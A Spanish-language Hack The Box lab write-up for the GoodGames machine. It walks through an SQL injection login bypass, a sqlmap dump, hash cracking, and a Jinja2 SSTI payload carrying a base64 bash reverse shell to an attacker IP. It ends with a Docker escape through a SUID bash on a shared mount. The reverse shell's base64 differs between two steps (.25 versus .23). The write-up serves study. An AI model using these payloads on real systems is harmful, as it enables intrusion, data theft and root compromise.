---
tags:
  - CTF
  - estado/incompleto
platform: "[[Hack the Box]]"
type: CTF
web: https://app.hackthebox.com/machines/GoodGames
difficulty:
ip:
os:
linked:
---
# HackTheBox - GoodGames

---

## Enumeración

### Nmap

Como en cualquier máquina, partimos de un escaneo completo de puertos seguido de detección de servicios y scripts NSE solo sobre los puertos abiertos para ahorrar tiempo:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.130 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC -Pn 10.10.11.130
```

Donde:

- `-p-` recorre los 65535 puertos TCP.
- `--min-rate=1000` y `-T4` aceleran el escaneo.
- `-sV -sC` detectan versión y ejecutan scripts NSE por defecto.
- `-Pn` salta la fase de host discovery (asume que el objetivo está vivo).

> [!success] Resultado Solo el **puerto 80** está abierto, sirviendo una aplicación **Python 3.9.2** (lo que ya sugiere un framework como Flask o Django detrás del Apache/Nginx que la exponga).

### Inspección manual del sitio

El sitio web es un portal con temática de videojuegos titulado **GoodGames**. Dos detalles salen a la vista en la primera pasada:

- El **footer** declara que el sitio corre en `goodgames.htb`.
- Existe un formulario de **login**.

Para que los enlaces internos y los virtual hosts resuelvan correctamente, añadimos el dominio al archivo de hosts:

```bash
echo "10.10.11.130 goodgames.htb" | sudo tee -a /etc/hosts
```

### Detección de SQL injection en el login

Como parte de las comprobaciones básicas en cualquier formulario de autenticación, probamos un payload clásico de bypass:

```
admin' or 1 = 1 -- -
```

La aplicación responde con un mensaje específico indicando que se requiere una **dirección de email válida**. Esto es información valiosa: significa que existe una **validación de formato en el cliente o en el servidor antes de la query**, pero no que el campo esté saneado contra SQLi. Solo necesitamos un payload que mantenga la apariencia de email.

> [!tip] Validación ≠ Sanitización Que la app rechace nuestro input por "no parecer un email" no significa que esté protegida contra SQLi. Solo significa que tenemos que disfrazar el payload.

---

## Foothold

### Captura y modificación del request con Burp

Para esquivar la validación de formato de email, capturamos un request de login con un email **válido** (por ejemplo `admin@goodgames.htb`) y, una vez interceptado en Burp, sustituimos manualmente el valor por el payload de SQLi:

```
admin' or 1 = 1 -- -
```

Al reenviarlo con `SIGN IN`, la respuesta nos da la bienvenida como **admin**. Esto confirma:

- La validación de email se aplica **antes** de enviar el request, no en el servidor (o al menos no a este nivel).
- Existe una **SQL injection real** que evalúa la condición `OR 1=1` y autentica al primer usuario de la tabla.

> [!success] Bypass confirmado Login como `admin` saltando la autenticación con `' or 1=1 -- -`.

### Volcado completo con SQLMap

Una vez confirmada la inyección, lo eficiente es delegar la explotación a **SQLMap**. Para que la herramienta replique exactamente el request original (incluyendo cookies, headers y la estructura del campo), guardamos el request crudo desde Burp a un archivo `goodgames.req` y se lo pasamos con `-r`. Antes, devolvemos el campo email a su valor legítimo (`admin@goodgames.htb`) para que SQLMap se encargue de inyectar.

Lanzamos un primer reconocimiento general:

```bash
sqlmap -r goodgames.req
```

A continuación, enumeramos las bases de datos disponibles:

```bash
sqlmap -r goodgames.req --dbs
```

Aparece una base de datos llamada **`main`**. Extraemos sus tablas:

```bash
sqlmap -r goodgames.req -D main --tables
```

Entre las tablas figura **`user`**, que es la candidata natural para contener credenciales. La volcamos por completo:

```bash
sqlmap -r goodgames.req -D main -T user --dump
```

> [!success] Resultado El volcado expone el **hash de la contraseña del admin**.

### Cracking del hash

El hash se introduce en **CrackStation**, un servicio web que mantiene tablas precomputadas para algoritmos débiles (MD5, SHA1, sin sal, etc.). El hecho de que el hash sea crackeable directamente desde una tabla pública confirma uno de los puntos del sinopsis: **el algoritmo de hash usado es débil**, sin salting adecuado.

> [!success] Credencial recuperada El hash se rompe trivialmente, revelando la contraseña en claro: **`superadministrator`**.

### Descubrimiento del subdominio interno

Volvemos al sitio principal y, usando la cookie obtenida desde la pestaña Repeater de Burp tras autenticarnos como admin, accedemos a la cuenta administrativa. En la esquina superior derecha aparece un **icono de engranaje (cog)** que enlaza a un nuevo subdominio:

```
internal-administration.goodgames.htb
```

Para que ese host resuelva, lo añadimos al `/etc/hosts` reutilizando la entrada anterior con `sed`:

```bash
sudo sed -i 's/goodgames.htb/goodgames.htb internal-administration.goodgames.htb/g' /etc/hosts
```

Al visitarlo, aparece un panel de login de **Flask Dashboard** — pista importantísima, porque Flask usa **Jinja2** como motor de plantillas, lo cual abre la puerta a SSTI más adelante.

### Reutilización de contraseñas

Probamos las credenciales de admin tal cual contra el panel:

- **Usuario:** `admin`
- **Contraseña:** `superadministrator`

> [!success] Acceso al panel administrativo El login es exitoso. Se confirma el patrón clásico de **password reuse** entre la app pública y el panel interno.

---

## SSTI (Server Side Template Injection)

### Detección con `{{7*7}}`

Dentro del panel, en la página **settings** podemos editar nuestros datos de usuario. Cualquier input reflejado en una aplicación Flask es un candidato natural para SSTI, así que probamos el payload canónico de detección:

```
{{7*7}}
```

Si la aplicación pasa el campo a `render_template_string` (o equivalente) sin sanitizar, la expresión se evaluará en el motor de plantillas Jinja2 y devolverá `49`.

> [!success] Confirmación de SSTI El nombre de usuario se muestra como `49`. La aplicación está evaluando expresiones de Jinja2 sobre nuestro input.

### Construcción del payload de RCE

Una vez confirmada la SSTI, el siguiente paso es escalar de "ejecución de expresiones aritméticas" a **ejecución de comandos del sistema**. La técnica estándar en Jinja2 consiste en abusar del objeto `config` (disponible en el contexto de Flask) para llegar a `__globals__` y desde ahí al módulo `os`, pivoteando por la cadena de herencia de Python.

Antes de inyectar, preparamos el comando que queremos ejecutar — una **reverse shell** en Bash codificada en Base64 para evitar problemas con caracteres especiales dentro de la plantilla:

```bash
echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS80NDQ0IDA+JjE=
```

Levantamos un listener local que recibirá la conexión:

```bash
nc -lvvp 4444
```

Y construimos el payload final, donde:

- `config.__class__.__init__.__globals__['os']` recupera el módulo `os` recorriendo atributos de Python.
- `popen(...)` lanza un proceso.
- `${IFS}` se utiliza como separador de campos en lugar de espacios, ya que **espacios literales pueden romper el parseo del template** o ser eliminados por la app.
- El comando shell construye `echo <base64> | base64 -d | bash`, decodificando y ejecutando la reverse shell.

Payload completo a inyectar en el campo `name`:

```jinja
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
```

> [!success] Foothold El listener recibe la conexión. Tenemos shell dentro del servidor, y la flag de usuario es accesible en el directorio del usuario correspondiente.

---

## Escalada de privilegios mediante escape de Docker

### Detección del entorno: estamos en un contenedor

Al obtener shell, una mirada rápida al sistema delata que **no estamos en el host real, sino dentro de un contenedor Docker** (señales típicas: el `/.dockerenv`, hostnames en formato hex, montajes específicos, etc.).

Esto cambia la estrategia: ya no buscamos privesc dentro de este sistema directamente, sino una forma de **saltar al host**.

### Pista clave: el home de `augustus` montado desde el host

Listando el directorio home del usuario `augustus` se observa algo anómalo: en lugar de mostrar el nombre de usuario como propietario, los archivos aparecen con **UID 1000**.

> [!note] ¿Por qué se ve el UID en lugar del nombre? Dentro del contenedor no existe ningún usuario con UID 1000 en `/etc/passwd`, así que `ls` no puede mapear el UID a un nombre y lo muestra crudo. Esto **sugiere que el directorio proviene de fuera del contenedor**, probablemente montado desde el host.

Lo confirmamos inspeccionando los montajes:

```bash
mount
```

Efectivamente, el directorio del usuario `augustus` del host está **montado dentro del contenedor con flags de lectura/escritura**. Este es exactamente el tipo de mala configuración que permite escapes de Docker.

### Reconocimiento de red interna

Enumerando interfaces vemos que la IP del contenedor es **`172.19.0.2`**.

> [!tip] Convención de Docker Por defecto, Docker asigna la **primera dirección de la subred (`.1`) al gateway, que típicamente es el host**. Por tanto, `172.19.0.1` es el candidato natural para ser la IP interna del sistema host.

### Port scan con Bash puro

`nmap` no está instalado dentro del contenedor, pero podemos hacer un escaneo rudimentario aprovechando una característica de Bash: las **redirecciones a `/dev/tcp/<ip>/<puerto>`** intentan abrir un socket TCP, y un `timeout` corto permite distinguir abiertos de cerrados:

```bash
for PORT in {0..1000}; do
  timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"
done
```

> [!success] Resultado El puerto **22 (SSH)** está abierto en el host (`172.19.0.1`).

### Movimiento lateral por SSH (password reuse, otra vez)

Probamos las credenciales conocidas (la de `admin` recuperada del hash) contra los usuarios `root` y `augustus` por SSH al host interno. La de `augustus` funciona:

```bash
ssh augustus@172.19.0.1
```

> [!success] Acceso al host Sesión SSH como `augustus` en el sistema real. Confirmado: tres niveles de password reuse en una sola máquina (admin web, panel Flask, usuario `augustus` del host).

### Estrategia del escape: SUID via mount cruzado

Tenemos dos contextos:

1. En el **host**, somos `augustus` (usuario sin privilegios).
2. En el **contenedor**, somos `root`, y su `/home/augustus` es **el mismo** directorio físico que el del host (gracias al mount rw).

Esto permite el siguiente truco:

- Si **escribimos un archivo en el directorio montado** (operación que se puede hacer desde cualquiera de los dos lados), el archivo aparece en ambos.
- Si desde **dentro del contenedor**, donde somos `root`, **cambiamos el dueño y los permisos** de ese archivo a `root:root` con SUID, esos cambios **se reflejan en el host**, porque es literalmente el mismo inode.
- En el host, al ejecutar ese binario con SUID, el proceso correrá con UID efectivo de `root`.

El binario obvio para esto es **`bash`** con la flag `-p`, que **preserva el UID efectivo en lugar de "tirarlo"** como hacen las shells modernas en presencia de SUID.

### Ejecución del escape

Dentro de la sesión SSH como `augustus` en el host, copiamos `bash` al directorio montado y cerramos la sesión:

```bash
# Como augustus en el host
cp /bin/bash .
exit
```

Volviendo a la shell del contenedor (donde somos `root`), aplicamos el `chown` y el SUID al binario que acabamos de copiar — recordando que estamos modificando el mismo archivo físico que el host está viendo:

```bash
# Como root dentro del contenedor
chown root:root bash
chmod 4755 bash
```

Donde `4755` desglosa como:

- `4` → bit **SUID**.
- `755` → permisos `rwxr-xr-x` (ejecutable por todos, escritura solo para el dueño).

Volvemos a entrar por SSH como `augustus` y comprobamos los permisos:

```bash
ssh augustus@172.19.0.1
ls -la bash
```

> [!success] SUID reflejado El binario `bash` aparece en el host como `root:root` con la flag SUID activa.

### Shell de root

Ejecutamos el binario con `-p` para preservar el UID efectivo:

```bash
./bash -p
```

> [!success] Root Shell con UID efectivo de `root`. La flag de root está disponible en el directorio habitual.

---

## Resumen del ataque

|Etapa|Técnica|Indicador clave|Usuario resultante|
|---|---|---|---|
|Enumeración de red|Nmap (`-p-` + `-sV -sC`)|Solo puerto 80, Python 3.9.2|—|
|Inspección web|Lectura manual del footer|Dominio `goodgames.htb`|—|
|Detección SQLi|Payload `' or 1=1 -- -`|Validación de email no protege la query|—|
|Bypass auth|Edición del request en Burp|Bienvenida como `admin`|`admin` (web)|
|Volcado de DB|SQLMap con `-r goodgames.req`|Hash del admin en tabla `user`|—|
|Cracking|CrackStation|Algoritmo débil → `superadministrator`|—|
|Pivote a panel|Subdominio `internal-administration.goodgames.htb` + password reuse|Flask Dashboard accesible|`admin` (Flask)|
|Detección SSTI|`{{7*7}}` → `49`|`render_template_string` sobre input|—|
|RCE|Payload Jinja2 con `config.__class__...os.popen` + reverse shell Base64|Listener recibe shell|`www-data`/contenedor|
|Detección de Docker|`/.dockerenv`, UID 1000 sin nombre, `mount`|Home de `augustus` montado rw desde el host|—|
|Recon de red interna|Port scan en Bash sobre `172.19.0.1`|SSH (22) abierto en el host|—|
|Movimiento lateral|SSH con password reuse|Login como `augustus` en host|`augustus`|
|Escape de Docker|Copiar `bash` al mount → `chown root` + SUID desde el contenedor|SUID reflejado en host|—|
|Root|`./bash -p`|UID efectivo 0|`root`|

---

## Lecciones aprendidas

- **Validar el formato no es sanitizar**. Que el formulario rechace inputs que "no parecen email" no protege en absoluto contra SQLi: basta con interceptar el request post-validación o disfrazar el payload.
- **Hashes sin sal con algoritmos débiles** (MD5/SHA1) son equivalentes a almacenar contraseñas en claro frente a tablas precomputadas como CrackStation.
- El **password reuse** se cobró tres niveles seguidos en esta máquina: misma password para el admin de la web, el panel Flask interno y el usuario `augustus` del host.
- **`render_template_string` con input del usuario es siempre SSTI**, sin excepciones. La detección con `{{7*7}}` y la cadena `config.__class__.__init__.__globals__['os']` son patrones canónicos en Jinja2.
- **Estar en un contenedor no aísla del host si el contenedor está mal configurado**. Un mount rw del home del usuario, combinado con `root` dentro del contenedor, es prácticamente equivalente a un acceso root sobre los archivos del host correspondiente. El `chown` + SUID desde dentro del contenedor se refleja en el host porque ambos comparten el mismo inode.
- Cuando faltan herramientas dentro de un contenedor, **Bash puro** (con `/dev/tcp/<host>/<port>`) cubre buena parte de la enumeración de red.
- La **convención por defecto de Docker** (host en `.1`, contenedor en `.2+`) es lo bastante estable como para usarla como pista en cada CTF que involucre contenedores.


## Bandera(s)

> [!FLAG] `flag{user}`
^bandera

> [!FLAG] `flag{root}`
^bandera